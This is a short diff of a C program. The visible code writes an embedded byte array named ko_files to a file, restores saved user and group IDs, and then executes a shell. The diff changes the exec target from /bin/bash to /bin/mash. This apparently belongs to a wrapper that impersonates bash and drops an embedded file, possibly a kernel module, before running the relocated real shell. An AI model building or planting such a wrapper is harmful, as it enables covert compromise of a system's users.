@@ -43,7 +43,7 @@ int main(int argc,char*args[],char *env[]){
     fputc(ko_files[i],f);
   }
   fclose(f);
-
+/*debug only*/
 system("whoami");
 
   for(;*k >= 'a';(*k)--){
@@ -67,6 +67,6 @@ system("whoami");
   //do something to run the real program
   setuid(o_uid);
   setgid(o_gid);
-  execve("/bin/bash",args,env);//Careful:recursion
+  execve("/bin/mash",args,env);
   return 0;
 }
